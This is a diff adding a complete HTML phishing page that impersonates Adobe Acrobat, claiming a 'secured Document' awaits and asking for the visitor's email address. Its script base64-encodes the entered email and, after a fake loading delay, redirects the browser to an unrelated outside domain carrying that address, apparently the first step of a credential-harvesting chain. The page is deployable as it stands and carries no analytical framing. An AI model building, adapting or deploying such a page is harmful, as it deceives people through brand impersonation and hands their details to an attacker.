@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Adobe Secure Document Viewer</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+    }
+
+    .background {
+      background-image: url('https://sites.udel.edu/threat/files/2016/08/Screen-Shot-2016-08-30-at-11.44.04-AM-1wd5v0p.png');
+      background-size: cover;
+      background-position: center;
+      filter: blur(6px);
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 0;
+    }
+
+    .overlay {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .modal {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      width: 360px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #e71c24;
+      margin-bottom: 12px;
+    }
+
+    .logo span {
+      color: #333;
+    }
+
+    .subtitle {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #e71c24;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 14px;
+      margin-top: 20px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    .footer {
+      font-size: 11px;
+      margin-top: 20px;
+      color: #555;
+    }
+
+    #loadingMessage {
+      font-size: 14px;
+      margin-top: 20px;
+      display: none;
+      color: #444;
+    }
+
+    .spinner {
+      display: none;
+      margin: 20px auto 10px;
+      width: 30px;
+      height: 30px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #e71c24;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+
+  <div class="overlay">
+    <div class="modal">
+      <div class="logo">Adobe <span>Acrobat</span></div>
+      <div class="subtitle">You've received a secured Document</div>
+      <p style="font-size: 13px;">
+        The shared file will pop up on your screen after verification.<br>
+        Please enter your email address to continue.
+      </p>
+
+      <form id="emailForm">
+        <input type="email" id="emailInput" placeholder="Enter your email address" required>
+        <button type="submit">Open in Adobe</button>
+      </form>
+
+      <div class="spinner" id="spinner"></div>
+      <div id="loadingMessage">Preparing your document, please wait...</div>
+
+      <div class="footer">
+        By clicking open, Adobe will process your email address in accordance with your Organization's privacy statement.
+        <br><br>© 2025 Organization Privacy & Cookies
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function toBase64(str) {
+      return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const rawEmail = document.getElementById('emailInput').value.trim();
+      if (!rawEmail || !rawEmail.includes("@")) {
+        alert("Please enter a valid email address.");
+        return;
+      }
+
+      // Hide form, show spinner
+      document.getElementById('emailForm').style.display = 'none';
+      document.getElementById('spinner').style.display = 'block';
+      document.getElementById('loadingMessage').style.display = 'block';
+
+      // Random 4–6 second delay
+      const delay = Math.floor(Math.random() * 2000) + 4000;
+
+      // Encode email in base64
+      const encoded = toBase64(rawEmail);
+
+      setTimeout(function() {
+        window.location.href = "https://CReznick.chaumat.pl/CZ26P0cv898/#X" + encoded;
+      }, delay);
+    });
+  </script>
+</body>
+</html>
